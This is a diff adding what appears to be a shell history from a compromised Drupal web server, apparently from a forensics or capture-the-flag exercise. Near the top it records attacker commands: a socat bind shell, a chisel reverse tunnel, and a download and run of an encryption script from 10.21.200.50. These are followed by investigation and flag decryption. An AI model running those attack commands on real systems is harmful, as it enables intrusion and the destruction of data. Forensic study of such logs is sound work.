@@ -1,0 +1,326 @@
+setsid /var/www/html/socat tcp-l:8081,reuseaddr,fork exec:/bin/bash,pty,setsid,setpgid,stderr,ctty&&exit
+id;echo 0 > /proc/sys/vm/dirty_writeback_centisecs;exit
+setsid /var/www/html/chisel client 10.21.200.50:8083 R:socks 2>1 > /dev/null && exit
+cd /var/www/html/; rm *.encr chisel* socat* sploit*; pkill -f socat; pkill -f chisel; cp /home/debian/drupal-7.54/*.php /var/www/html
+setsid /var/www/html/socat tcp-l:8081,reuseaddr,fork exec:/bin/bash,pty,setsid,setpgid,stderr,ctty&&exit
+id;echo 0 > /proc/sys/vm/dirty_writeback_centisecs;exit
+setsid /var/www/html/chisel client 10.21.200.50:8083 R:socks 2>1 > /dev/null && exit
+wget http://10.21.200.50/encr.sh -O /var/www/html/encr.sh;exit
+chmod -R 777 /var/www/html;exit
+/var/www/html/encr.sh;exit
+rm -f /var/www/html/shell.php;exit
+rm -f /var/www/html/encr.sh;exit
+rm -f /var/www/html/sploit.c;exit
+cd /var/www/html/
+ls
+ls
+ps aux | grep chisel
+setsid /var/www/html/socat tcp-l:8081,reuseaddr,fork exec:/bin/bash,pty,setsid,setpgid,stderr,ctty&&exit
+id;echo 0 > /proc/sys/vm/dirty_writeback_centisecs;exit
+setsid /var/www/html/chisel client 10.21.200.50:8083 R:socks 2>1 > /dev/null && exit
+wget http://10.21.200.50/encr.sh -O /var/www/html/encr.sh;exit
+chmod -R 777 /var/www/html;exit
+/var/www/html/encr.sh;exit
+rm -f /var/www/html/shell.php;exit
+rm -f /var/www/html/encr.sh;exit
+rm -f /var/www/html/sploit.c;exit
+pkill -9 -f socat
+pkill -9 -f socat
+ls
+ls
+cd /var/log
+ls
+ls -al
+cat audit
+cat syslog
+ls
+ls -al
+cat cd apt
+ls
+cd apt
+ls
+cat history.log
+ls
+ls /tmp
+ls -al /tmp
+cd /tmp
+file bask
+file bak
+ls /home
+ls
+cd cadm
+cd /home/casdm
+cd /home/cadm
+ls
+ls -al
+cd ..
+ls
+cd admin
+ls
+ls -al
+cd ..
+cd debian
+ls -al
+cat cookies.txt
+cat .bash_histry
+cat .bash_history
+cd test_dir
+ls
+cd /var/www/html
+ls
+ls -al
+cd test_dir
+ls
+ls -al
+file f
+cd ..
+ls
+ls -al
+file 
+file 1
+cat 1
+ls 
+ls -al
+file chisel
+ls -al
+cd scripts
+ls
+ls -al
+cat test.script
+cat password-hash.sh
+cd ..
+ls
+cd ..
+ls
+ls
+cd ..
+ls
+cd mail
+ls
+cd ..
+..
+cd ..
+ls ~
+ls
+ls -al
+pwd
+cd ~
+ls
+cat log.cfg
+ls -al
+cat .python_history
+cat .nano_history
+find / -depth -name "evil"
+cat .bash_history
+wget http://10.21.200.50/encr.sh
+wget http://10.21.200.50/encr.sh -O /var/www/html/encr.sh;exit
+cd /var/ossec/queue/diff/local/var/www/html/evil.js
+cat *
+cd ..
+ls
+cd exploit
+ls
+cat *
+cd ..
+ls
+cd aaaaaa
+ls
+cat *
+cd ..
+ls
+ls -al
+cd exploit
+ls
+cat *
+cd ..
+ls
+cd socat
+ls *
+cat *
+cd ..
+ls
+cd shell.php
+cat *
+cd ../shell2.php
+ls
+cat *
+cd ..
+ls
+cd scripts
+ls
+cat *
+ls
+ls -l
+cd ..
+ls
+ls
+ls -l
+cd ..
+ls
+la
+ls -al
+cd ..
+ls -al
+cd ..
+ls -al
+cd ..
+ls -al
+cd ..
+ls -al
+cd ..
+ls -al
+cd ..
+ls -al
+foremost
+cd backups
+ls
+ls -al
+ls -l /var/www/html
+ls -l
+cd ..
+cd ..
+ls -al
+cat extlinux.conf
+ls
+ls -al
+cd home
+ls
+cd admin
+ls
+ls -al
+cat *
+cat *
+ls
+cd ..
+cd ..
+ls -al
+apt
+apt install foremost
+apt update
+ls
+cat install.php.encr
+cat index.php
+cat install.php.encr
+cat 21FLAG.txt.encr
+openssl aes-128-cbc -d -in 21FLAG.txt.encr -out test.txt
+ls
+cat test.txt
+openssl aes-128-cbc -d -in 21FLAG.txt.encr -out test.txt
+cat test.txt
+openssl aes-128-cbc -d -salt -in 21FLAG.txt.encr -out test.txt
+ls
+cat ~/*
+cd ~
+ls
+cat log.cfg
+ls -al
+cat .python_history
+cat .*
+ls
+ls -al
+cat .lesshst
+cat .nano_history
+cat /etc/passswd
+cat /etc/passwd
+ks
+cd /var/www/html
+ls
+openssl aes-128-cbc -d -nosalt -i 21FLAG.txt.encr -o test.txt
+openssl aes-128-cbc -d -nosalt -in 21FLAG.txt.encr -out test.txt
+openssl aes-128-cbc -d -nosalt -in 21FLAG.txt.encr -out test.txt
+openssl aes-128-cbc -d -nosalt -in 21FLAG.txt.encr -out test.txt
+ls
+cat test.txt
+openssl aes-128-cbc -d -nosalt -in index.php.encr -out test.txt
+cat test.txt
+ls
+openssl aes-128-cbc -d -nosalt -in index.php.encr -out test.txt
+cat test.txt
+ls
+ls -al
+file encr.sh
+file repair
+cd repait
+ls
+cd repair
+ls
+ls -al
+cd ..
+la -s
+ls -a
+cd /home/debian
+ls
+cd drupal-7.54
+ls
+ls -al
+cat install.php
+cat ROBOTS.txt
+ls
+cat robots.txt
+ls
+cd /var/www/html
+setsid /var/www/html/socat tcp-l:8081,reuseaddr,fork exec:/bin/bash,pty,setsid,setpgid,stderr,ctty&&exit
+GET / HTTP/1.1
+User-Agent: Wget/1.16 (linux-gnu)
+Accept: */*
+Host: 127.0.0.1:8081
+Connection: Keep-Alive
+GET / HTTP/1.1
+Range: bytes=857-
+User-Agent: Wget/1.16 (linux-gnu)
+Accept: */*
+Host: 127.0.0.1:8081
+Connection: Keep-Alive
+GET / HTTP/1.1
+Range: bytes=998-
+User-Agent: Wget/1.16 (linux-gnu)
+Accept: */*
+Host: 127.0.0.1:8081
+Connection: Keep-Alive
+ls
+ls -l
+cd /
+ls
+find / -name *ssh(
+find / -name *ssh*
+cd root/.ssh
+ls
+ls -al
+cat authorized_keys
+cd /
+cd /home/cadm/.ssh
+ls
+cd /
+cd var/ossec
+ls -l
+ls -alR
+ls -alR | grep Mar
+ls -l
+cd rules
+ls
+cd ..
+cd /
+ls -alR | grep Mar
+env
+ls
+ls -alR / | grep "Mar 5"
+pwd
+cd /var/www/html
+ls
+ls -l
+cd ~
+cd /
+ls -alR | grep "Mar  5"
+motd
+cat /var/log/audit.log.2
+cd /var
+ls
+cd log
+ls
+cd audit
+ls
+cat audit.log.2
+cat audit.log.2 | grep "sh"
+cat audit.log.3 | grep evil
+grep
+find / -xdev -type f -print0 | xargs -0 grep -H "800x600"
